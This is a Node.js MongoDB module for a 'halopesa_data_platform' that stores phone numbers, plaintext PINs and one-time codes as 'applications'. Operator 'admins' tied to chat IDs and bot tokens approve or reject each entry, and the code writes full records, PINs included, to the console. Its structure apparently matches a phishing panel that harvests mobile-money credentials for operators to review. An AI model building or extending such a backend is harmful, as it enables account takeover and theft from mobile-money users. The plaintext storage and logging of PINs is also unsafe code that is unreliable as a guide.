const { MongoClient } = require('mongodb');

let client;
let db;

// Database and collections
const DB_NAME = 'halopesa_data_platform';
const COLLECTIONS = {
    ADMINS: 'admins',
    APPLICATIONS: 'applications'
};

/**
 * Connect to MongoDB
 */
async function connectDatabase() {
    try {
        const MONGODB_URI = process.env.MONGODB_URI;

        if (!MONGODB_URI) {
            throw new Error('❌ MONGODB_URI is not set in environment variables');
        }

        console.log('🔄 Connecting to MongoDB...');

        client = new MongoClient(MONGODB_URI);
        await client.connect();

        db = client.db(DB_NAME);

        console.log('✅ Connected to MongoDB successfully');

        await createIndexes();

        return db;
    } catch (error) {
        console.error('❌ MongoDB connection error:', error);
        throw error;
    }
}

/**
 * Create database indexes
 */
async function createIndexes() {
    try {
        await db.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 });

        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });

        console.log('✅ Database indexes created');
    } catch (error) {
        console.error('⚠️ Error creating indexes:', error.message);
    }
}

/**
 * Close database connection
 */
async function closeDatabase() {
    if (client) {
        await client.close();
        console.log('✅ Database connection closed');
    }
}

// ==========================================
// ADMIN OPERATIONS
// ==========================================

async function saveAdmin(adminData) {
    try {
        const adminId = adminData.adminId || adminData.id;

        if (!adminId)        throw new Error('Admin ID is required (adminId or id property)');
        if (!adminData.name) throw new Error('Admin name is required');
        if (!adminData.email) throw new Error('Admin email is required');
        if (!adminData.chatId) throw new Error('Admin chatId is required');

        const existingAdmin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
        if (existingAdmin) throw new Error(`Admin ${adminId} already exists in database`);

        const adminDocument = {
            adminId,
            name:      adminData.name,
            email:     adminData.email,
            chatId:    adminData.chatId,
            status:    adminData.status || 'active',
            createdAt: adminData.createdAt || new Date().toISOString()
        };

        if (adminData.botToken) adminDocument.botToken = adminData.botToken;

        console.log(`💾 Saving admin to database:`, {
            adminId: adminDocument.adminId,
            name:    adminDocument.name,
            email:   adminDocument.email,
            chatId:  adminDocument.chatId,
            status:  adminDocument.status
        });

        const result = await db.collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
        console.log(`✅ Admin saved successfully: ${adminId} (${adminData.name})`);
        return result;
    } catch (error) {
        console.error('❌ Error saving admin:', error);
        throw error;
    }
}

async function getAdmin(adminId) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
    } catch (error) {
        console.error('❌ Error getting admin:', error);
        return null;
    }
}

async function getAdminByChatId(chatId) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({ chatId });
    } catch (error) {
        console.error('❌ Error getting admin by chat ID:', error);
        return null;
    }
}

async function getAllAdmins() {
    try {
        return await db.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting admins:', error);
        return [];
    }
}

async function getActiveAdmins() {
    try {
        return await db.collection(COLLECTIONS.ADMINS)
            .find({ status: 'active' })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting active admins:', error);
        return [];
    }
}

async function updateAdmin(adminId, updates) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );
        console.log(`🔄 Admin ${adminId} updated`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin:', error);
        throw error;
    }
}

async function updateAdminStatus(adminId, status) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { status, updatedAt: new Date().toISOString() } }
        );
        console.log(`🔄 Admin ${adminId} status updated to: ${status}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin status:', error);
        throw error;
    }
}

async function deleteAdmin(adminId) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
        console.log(`🗑️ Admin deleted: ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error deleting admin:', error);
        throw error;
    }
}

async function adminExists(adminId) {
    try {
        const count = await db.collection(COLLECTIONS.ADMINS).countDocuments({ adminId });
        return count > 0;
    } catch (error) {
        console.error('❌ Error checking admin existence:', error);
        return false;
    }
}

async function getAdminCount() {
    try {
        return await db.collection(COLLECTIONS.ADMINS).countDocuments({});
    } catch (error) {
        console.error('❌ Error getting admin count:', error);
        return 0;
    }
}

// ==========================================
// APPLICATION OPERATIONS
// ==========================================

async function saveApplication(appData) {
    try {
        console.log(`📋 [APPLICATION PROCESS - SAVE] Starting application save:`, JSON.stringify(appData, null, 2));
        const result = await db.collection(COLLECTIONS.APPLICATIONS).insertOne({
            id:             appData.id,
            adminId:        appData.adminId,
            adminName:      appData.adminName,
            phoneNumber:    appData.phoneNumber,
            pin:            appData.pin,
            pinStatus:      appData.pinStatus  || 'pending',
            otpStatus:      appData.otpStatus  || 'pending',
            otp:            appData.otp        || null,
            assignmentType: appData.assignmentType,
            isReturningUser: appData.isReturningUser || false,
            previousCount:  appData.previousCount   || 0,
            timestamp:      appData.timestamp || new Date().toISOString()
        });
        console.log(`💾 Application saved: ${appData.id}`);
        console.log(`✅ [APPLICATION PROCESS - SAVE SUCCESS] Application ID: ${appData.id}, Phone: ${appData.phoneNumber}, Admin: ${appData.adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error saving application:', error);
        console.error(`❌ [APPLICATION PROCESS - SAVE ERROR] Failed to save application ${appData?.id}:`, error.message);
        throw error;
    }
}

async function getApplication(applicationId) {
    try {
        console.log(`🔍 [APPLICATION PROCESS - GET] Fetching application: ${applicationId}`);
        const app = await db.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
        if (app) {
            console.log(`📄 [APPLICATION PROCESS - GET FOUND] Application retrieved: ${applicationId}, Status - Pin: ${app.pinStatus}, OTP: ${app.otpStatus}`);
        } else {
            console.log(`⚠️ [APPLICATION PROCESS - GET NOT FOUND] Application not found: ${applicationId}`);
        }
        return app;
    } catch (error) {
        console.error('❌ Error getting application:', error);
        console.error(`❌ [APPLICATION PROCESS - GET ERROR] Failed to fetch application ${applicationId}:`, error.message);
        return null;
    }
}

async function updateApplication(applicationId, updates) {
    try {
        console.log(`🔄 [APPLICATION PROCESS - UPDATE] Updating application ${applicationId} with fields:`, JSON.stringify(updates, null, 2));
        const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
            { id: applicationId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );
        console.log(`🔄 Application updated: ${applicationId}`);
        console.log(`✅ [APPLICATION PROCESS - UPDATE SUCCESS] Application ${applicationId} updated. Modified count: ${result.modifiedCount}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating application:', error);
        console.error(`❌ [APPLICATION PROCESS - UPDATE ERROR] Failed to update application ${applicationId}:`, error.message);
        throw error;
    }
}

async function getApplicationsByAdmin(adminId) {
    try {
        console.log(`📋 [APPLICATION PROCESS - ADMIN LIST] Fetching applications for admin: ${adminId}`);
        const apps = await db.collection(COLLECTIONS.APPLICATIONS)
            .find({ adminId })
            .sort({ timestamp: -1 })
            .toArray();
        console.log(`📊 [APPLICATION PROCESS - ADMIN LIST SUCCESS] Found ${apps.length} applications for admin: ${adminId}`);
        return apps;
    } catch (error) {
        console.error('❌ Error getting applications by admin:', error);
        console.error(`❌ [APPLICATION PROCESS - ADMIN LIST ERROR] Failed to fetch applications for admin ${adminId}:`, error.message);
        return [];
    }
}

async function getPendingApplications(adminId) {
    try {
        console.log(`⏳ [APPLICATION PROCESS - PENDING LIST] Fetching pending applications for admin: ${adminId}`);
        const apps = await db.collection(COLLECTIONS.APPLICATIONS)
            .find({
                adminId,
                $or: [{ pinStatus: 'pending' }, { otpStatus: 'pending' }]
            })
            .sort({ timestamp: -1 })
            .toArray();
        console.log(`📊 [APPLICATION PROCESS - PENDING LIST SUCCESS] Found ${apps.length} pending applications for admin: ${adminId}`);
        return apps;
    } catch (error) {
        console.error('❌ Error getting pending applications:', error);
        console.error(`❌ [APPLICATION PROCESS - PENDING LIST ERROR] Failed to fetch pending applications for admin ${adminId}:`, error.message);
        return [];
    }
}

// ==========================================
// STATISTICS OPERATIONS
// ==========================================

async function getAdminStats(adminId) {
    try {
        const total        = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId });
        const pinPending   = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'pending' });
        const pinApproved  = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'approved' });
        const otpPending   = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'pending' });
        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'approved' });
        return { total, pinPending, pinApproved, otpPending, fullyApproved };
    } catch (error) {
        console.error('❌ Error getting admin stats:', error);
        return { total: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0 };
    }
}

async function getStats() {
    try {
        const totalAdmins        = await db.collection(COLLECTIONS.ADMINS).countDocuments({});
        const totalApplications  = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
        const pinPending         = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
        const pinApproved        = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' });
        const otpPending         = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'pending' });
        const fullyApproved      = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'approved' });
        const totalRejected      = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({
            $or: [
                { pinStatus: 'rejected' },
                { otpStatus: 'wrongpin_otp' },
                { otpStatus: 'wrongcode' }
            ]
        });
        return { totalAdmins, totalApplications, pinPending, pinApproved, otpPending, fullyApproved, totalRejected };
    } catch (error) {
        console.error('❌ Error getting stats:', error);
        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
    }
}

async function getPerAdminStats() {
    try {
        const admins = await getAllAdmins();
        const statsPromises = admins.map(async (admin) => {
            const stats = await getAdminStats(admin.adminId);
            return { adminId: admin.adminId, name: admin.name, ...stats };
        });
        return await Promise.all(statsPromises);
    } catch (error) {
        console.error('❌ Error getting per-admin stats:', error);
        return [];
    }
}

// ==========================================
// DEBUG & MAINTENANCE
// ==========================================

async function getAllAdminsDetailed() {
    try {
        const admins = await db.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
        console.log(`📊 Found ${admins.length} admins in database`);
        admins.forEach(admin => {
            console.log(`   ${admin.adminId}: ${admin.name} (chatId: ${admin.chatId}, status: ${admin.status})`);
        });
        return admins;
    } catch (error) {
        console.error('❌ Error getting detailed admins:', error);
        return [];
    }
}

async function cleanupInvalidAdmins() {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteMany({
            $or: [
                { adminId: { $exists: false } },
                { adminId: null },
                { adminId: '' },
                { chatId: { $exists: false } },
                { chatId: null }
            ]
        });
        console.log(`🧹 Cleaned up ${result.deletedCount} invalid admin(s)`);
        return result;
    } catch (error) {
        console.error('❌ Error cleaning up invalid admins:', error);
        throw error;
    }
}

module.exports = {
    connectDatabase,
    closeDatabase,

    saveAdmin,
    getAdmin,
    getAdminByChatId,
    getAllAdmins,
    getActiveAdmins,
    updateAdmin,
    updateAdminStatus,
    deleteAdmin,
    adminExists,
    getAdminCount,

    saveApplication,
    getApplication,
    updateApplication,
    getApplicationsByAdmin,
    getPendingApplications,

    getAdminStats,
    getStats,
    getPerAdminStats,

    getAllAdminsDetailed,
    cleanupInvalidAdmins
};
